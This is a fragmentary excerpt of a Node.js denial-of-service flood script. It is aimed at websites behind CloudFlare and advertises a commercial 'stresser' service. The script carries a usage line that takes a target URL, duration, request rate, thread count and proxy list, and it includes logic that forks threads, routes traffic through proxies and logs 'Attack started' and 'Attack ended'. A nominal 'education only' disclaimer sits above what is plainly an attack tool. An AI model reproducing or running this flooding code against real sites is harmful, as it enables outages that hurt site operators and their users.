// This is purpose education only
// Best Stresser > vire.cc
...
This script is for CloudFlare targets
此脚本适用于 CloudFlare 目标
 
用法: node CLOUDFLARE.js [target] [time] [rps] [threads] [proxy]
例子: node CLOUDFLARE.js https://vire.cc 300 32 8 proxy.txt

This is made by @zashfarm (worst developer)
这是由@zashfarm（最差的开发人员）制作的
`); process.exit();}
 const headers = {};
 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`${getCurrentTime()} [CLOUDFLARE]  title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request timeout | @zashfarm') {
        console.log(`${getCurrentTime()} [CLOUDFLARE] Request timeout`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`${getCurrentTime()} [CLOUDFLARE]  title: ${extractedTitle} `);
      } else {
        console.log(`${getCurrentTime()} [CLOUDFLARE]  ${error.message}`);
      }
    });
}
...
`);
  ...
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`${getCurrentTime()} [CLOUDFLARE]  Threads:  ${i} | @zashfarm`);
  }
  console.log(`${getCurrentTime()} [CLOUDFLARE]  Attack started! `);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`${getCurrentTime()} [CLOUDFLARE]  Attack ended `);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
 ...
 class NetSocket {
  ...
  HTTP(options, callback) {
     ...
     connection.on("data", chunk => {
         ...
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "Error : Invalid response from proxy server | @zashfarm");
         }
     ...
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "Error: Request Timeout | @zashfarm");
     });
...
// create headers / select headers (标题系统)
